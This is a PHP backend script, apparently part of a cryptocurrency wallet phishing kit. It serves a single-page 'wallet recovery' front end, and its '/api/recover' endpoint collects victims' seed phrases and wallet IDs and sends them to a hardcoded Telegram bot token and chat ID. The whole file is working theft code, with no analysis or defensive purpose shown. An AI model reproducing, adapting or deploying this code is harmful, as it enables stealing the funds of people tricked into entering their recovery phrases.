<?php

$uri = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
$method = $_SERVER['REQUEST_METHOD'];

$dist = __DIR__ . "/dist";

# ============================
# API ROUTE
# ============================
if ($uri === "/api/recover") {

    if ($method !== "POST") {
        http_response_code(405);
        echo "Only POST allowed";
        exit;
    }

    $input = json_decode(file_get_contents("php://input"), true);

    if (!$input) {
        http_response_code(400);
        echo json_encode(["error" => "invalid input"]);
        exit;
    }

    $walletID = $input["walletId"] ?? "";
    $mode = $input["mode"] ?? "";
    $phrase = $input["phrase"] ?? [];

    $message = "";

    switch ($mode) {

        case "seed":

            $message .= "<b>Wallet Information</b>\n\n";
            $message .= "Wallet ID : {$walletID}\n";
            $message .= "Mode      : {$mode}\n\n";

            $message .= "<b>Seed Phrases</b>\n\n";
            $message .= "<pre>\n";
            $message .= "No  | Phrase\n";
            $message .= "----|-------------------------\n";

            foreach ($phrase as $i => $p) {
                $num = $i + 1;
                $message .= sprintf("%-3d | %s\n", $num, $p);
            }

            $message .= "</pre>";

            break;

        case "privatekey":

            $message .= "<b>Wallet Information</b>\n\n";
            $message .= "Wallet ID : {$walletID}\n";
            $message .= "Mode      : {$mode}\n\n";
            $message .= "<b>Private Key Mode Activated</b>";

            break;

        default:
            http_response_code(400);
            echo "Unknown walletId";
            exit;
    }

    error_log("Generated Telegram Message:\n" . $message);

    $result = sendTelegramMessage($message);

    if (!$result) {
        http_response_code(500);
        echo "Failed to send Telegram message";
        exit;
    }

    echo json_encode(["status" => "success"]);
    exit;
}


# ============================
# STATIC FILE HANDLING
# ============================

$file = $dist . $uri;

if ($uri !== "/" && file_exists($file) && is_file($file)) {

    $ext = pathinfo($file, PATHINFO_EXTENSION);

    $mimeTypes = [
        "js" => "application/javascript",
        "css" => "text/css",
        "svg" => "image/svg+xml",
        "png" => "image/png",
        "jpg" => "image/jpeg",
        "jpeg" => "image/jpeg",
        "html" => "text/html",
        "json" => "application/json",
        "woff" => "font/woff",
        "woff2" => "font/woff2"
    ];

    if (isset($mimeTypes[$ext])) {
        header("Content-Type: " . $mimeTypes[$ext]);
    }

    readfile($file);
    exit;
}


# ============================
# SPA FALLBACK
# ============================

readfile($dist . "/index.html");


# ============================
# TELEGRAM FUNCTION
# ============================

function sendTelegramMessage($message)
{
    $botToken = "8637423679:AAGjcXhE3qv9TWM1LxRqGQoplQ-zXNGFyNw";
    $chatID = "7721450225";

    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";

    $data = [
        "chat_id" => $chatID,
        "text" => $message,
        "parse_mode" => "HTML"
    ];

    $options = [
        "http" => [
            "header" => "Content-Type: application/x-www-form-urlencoded",
            "method" => "POST",
            "content" => http_build_query($data)
        ]
    ];

    $context = stream_context_create($options);
    $response = file_get_contents($url, false, $context);

    error_log("Telegram Response: " . $response);

    return $response !== false;
}